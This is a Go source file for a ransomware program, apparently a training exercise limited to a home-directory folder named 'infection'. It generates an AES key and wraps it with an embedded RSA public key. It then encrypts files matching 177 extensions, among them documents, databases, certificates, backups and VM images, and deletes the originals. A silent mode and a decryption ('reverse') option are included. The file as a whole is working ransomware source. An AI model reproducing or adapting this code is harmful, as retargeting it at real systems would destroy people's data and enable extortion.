package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	_ "embed"
	"encoding/pem"
	"fmt"
	"io/fs"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"

	"github.com/spf13/pflag"
)

var s = pflag.BoolP("silent", "s", false, "Produce no output")

//go:embed README.md
var help string

//go:embed rsaPub.txt
var assymKeyPub []byte

var decryptedKey []byte
var symKey []byte

var Extensions = [177]string{
	"der", "pfx", "key", "crt", "csr", "p12", "pem", "odt", "ott", "sxw", "stw", "uot", "3ds",
	"max", "3dm", "ods", "ots", "sxc", "stc", "dif", "slk", "wb2", "odp", "otp", "sxd", "std",
	"uop", "odg", "otg", "sxm", "mml", "lay", "lay6", "asc", "sqlite3", "sqlitedb", "sql", "accdb",
	"mdb", "db", "dbf", "odb", "frm", "myd", "myi", "ibd", "mdf", "ldf", "sln", "suo", "cs", "c",
	"cpp", "pas", "h", "asm", "js", "cmd", "bat", "ps1", "vbs", "vb", "pl", "dip", "dch", "sch",
	"brd", "jsp", "php", "asp", "rb", "java", "jar", "class", "sh", "mp3", "wav", "swf", "fla",
	"wmv", "mpg", "vob", "mpeg", "asf", "avi", "mov", "mp4", "3gp", "mkv", "3g2", "flv", "wma",
	"mid", "m3u", "m4u", "djvu", "svg", "ai", "psd", "nef", "tiff", "tif", "cgm", "raw", "gif",
	"png", "bmp", "vcd", "iso", "backup", "zip", "rar", "7z", "gz", "tgz", "tar", "bak", "tbk",
	"bz2", "PAQ", "ARC", "aes", "gpg", "vmx", "vmdk", "vdi", "sldm", "sldx", "sti", "sxi", "602",
	"hwp", "edb", "potm", "potx", "ppam", "ppsx", "ppsm", "pps", "pot", "pptm", "xltm", "xltx",
	"xlc", "xlm", "xlw", "xlsb", "xlsm", "dotx", "dotm", "dot", "docm", "docb", "jpg", "jpeg",
	"snt", "onetoc2", "dwg", "pdf", "wkl", "wks", "123", "rtf", "csv", "txt", "vsdx", "vsd", "eml",
	"msg", "ost", "pst", "pptx", "ppt", "xlsx", "xls", "docx", "doc",
}

func decryptFiles(key []byte, filename string) error {
	cipherText, err := ioutil.ReadFile(filename)
	if err != nil {
		return err
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return err
	}
	nonce := make([]byte, gcm.NonceSize())
	for i := 0; i < len(nonce); i++ {
		nonce[i] = 42
	}
	plainText, err := gcm.Open(nil, nonce, cipherText, nil)
	if err != nil {
		return err
	}

	filename = strings.TrimSuffix(filename, ".ft")

	err = ioutil.WriteFile(filename, plainText, 0777)
	if err != nil {
		return err
	}
	if !(*s) {
		fmt.Printf("File %s was decrypted\n", filename)
	}
	return nil
}

func checkFilesRev(path string, d fs.DirEntry, err error) error {
	if err != nil {
		return err
	}
	if d.IsDir() {
		return nil
	}
	if !strings.HasSuffix(path, ".ft") {
		return nil
	}
	if err := decryptFiles(decryptedKey, path); err != nil {
		return err
	}
	return nil
}

func writeEncryptedKey(encryptedSymKey []byte) error {
	if err := ioutil.WriteFile("encryptedKey.txt", encryptedSymKey, 0777); err != nil {
		return err
	}
	return nil
}

func encryptFiles(fileBytes []byte, filename string) error {
	block, err := aes.NewCipher(symKey)
	if err != nil {
		return err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return err
	}

	nonce := make([]byte, gcm.NonceSize())
	for i := 0; i < len(nonce); i++ {
		nonce[i] = 42
	}
	cipherText := gcm.Seal(nil, nonce, fileBytes, nil)
	err = ioutil.WriteFile(filename+".ft", cipherText, 0777)
	if err != nil {
		return err
	}
	os.Remove(filename)
	if !(*s) {
		fmt.Printf("File %s was encrypted\n", filename)
	}
	return nil
}

func checkFiles(path string, d fs.DirEntry, err error) error {
	if err != nil {
		return err
	}
	if strings.HasSuffix(path, ".ft") {
		return nil
	}
	if d.IsDir() {
		return nil
	}
	for i := 0; i < len(Extensions); i++ {
		if !strings.HasSuffix(d.Name(), Extensions[i]) {
			continue
		} else {
			var file []byte
			var err error
			if file, err = os.ReadFile(path); err != nil {
				return err
			}
			if err := encryptFiles(file, path); err != nil {
				return err
			}
			break
		}
	}
	return nil
}

// EncryptWithPublicKey encrypts data with public key
func encryptWithPublicKey(msg []byte, pub *rsa.PublicKey) ([]byte, error) {
	ciphertext, err := rsa.EncryptPKCS1v15(rand.Reader, pub, msg)
	if err != nil {
		return nil, err
	}
	return ciphertext, nil
}

// BytesToPublicKey bytes to public key
func bytesToPublicKey(pub []byte) (*rsa.PublicKey, error) {
	block, _ := pem.Decode(pub)
	enc := x509.IsEncryptedPEMBlock(block)
	b := block.Bytes
	var err error
	if enc {
		b, err = x509.DecryptPEMBlock(block, nil)
		if err != nil {
			return nil, err
		}
	}
	ifc, err := x509.ParsePKIXPublicKey(b)
	if err != nil {
		return nil, err
	}
	key, ok := ifc.(*rsa.PublicKey)
	if !ok {
		return nil, err
	}
	return key, nil
}

func generateSymmKey() ([]byte, error) {
	key := make([]byte, 16)

	_, err := rand.Read(key)
	if err != nil {
		return nil, err
	}
	return key, nil
}

func main() {
	h := pflag.BoolP("help", "h", false, "Get help")
	v := pflag.BoolP("version", "v", false, "Get version")
	r := pflag.StringP("reverse", "r", "", "Reverse infection")
	pflag.Parse()
	home, err := os.UserHomeDir()
	if err != nil {
		fmt.Printf("Error %v\n", err)
		return
	}
	if *r != "" {
		var err error
		if decryptedKey, err = os.ReadFile(*r); err != nil {
			if !(*s) {
				fmt.Printf("Error %v\n", err)
			}
		}
		if err := filepath.WalkDir(home+"/infection", checkFilesRev); err != nil {
			if !(*s) {
				fmt.Printf("Error %v\n", err)
			}
			return
		}

	} else {
		if *v {
			fmt.Printf("Version 1.0\n")
			return
		}
		if *h {
			fmt.Printf("Help:\n %s", help)
			return
		}

		var assymKey *rsa.PublicKey
		var err error
		if assymKey, err = bytesToPublicKey(assymKeyPub); err != nil {
			if !(*s) {
				fmt.Printf("Error %v\n", err)
			}
			return

		}
		if symKey, err = generateSymmKey(); err != nil {
			if !(*s) {
				fmt.Printf("Error %v\n", err)
			}
			return
		}
		var encryptedSymKey []byte
		if encryptedSymKey, err = encryptWithPublicKey(symKey, assymKey); err != nil {
			if !(*s) {
				fmt.Printf("Error %v\n", err)
			}
			return
		}
		if err := writeEncryptedKey(encryptedSymKey); err != nil {
			if !(*s) {
				fmt.Printf("Error %v\n", err)
			}
			return
		}
		if err := filepath.WalkDir(home+"/infection", checkFiles); err != nil {
			if !(*s) {
				fmt.Printf("Error %v\n", err)
			}
			return
		}
	}

}
